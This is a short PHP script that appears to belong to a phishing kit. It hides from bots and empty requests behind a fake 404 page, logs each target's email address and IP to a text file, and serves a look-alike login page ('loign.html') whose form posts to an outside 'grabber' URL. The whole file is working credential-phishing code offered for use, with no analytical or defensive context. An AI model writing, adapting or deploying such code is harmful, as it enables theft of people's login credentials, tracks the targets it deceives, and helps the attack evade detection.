<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if($_GET['mail']=="") {
	$fp = fopen("ss.txt","a");
    fwrite($fp,"[DETECTED EMPTY MAIL]\n");
    fclose($fp);
	http_response_code(404);
	echo "404 Not Found";
	die();
}
if($ua == "") {
	$fp = fopen("ss.txt","a");
    fwrite($fp,"[DETECTED ROBOT]\n");
    fclose($fp);
	http_response_code(404);
	echo "404 Not Found";
	die();
}
$mail = $_GET['mail'];
$fp = fopen("ss.txt","a");
fwrite($fp,$mail . " - " . $_SERVER['REMOTE_ADDR']."\n");
fclose($fp);
$html = str_replace(array('<grabberurl>','<mailget>'),array('https://www.wintherlanden.com/loign.php',$mail),file_get_contents('loign.html'));
echo $html;
?>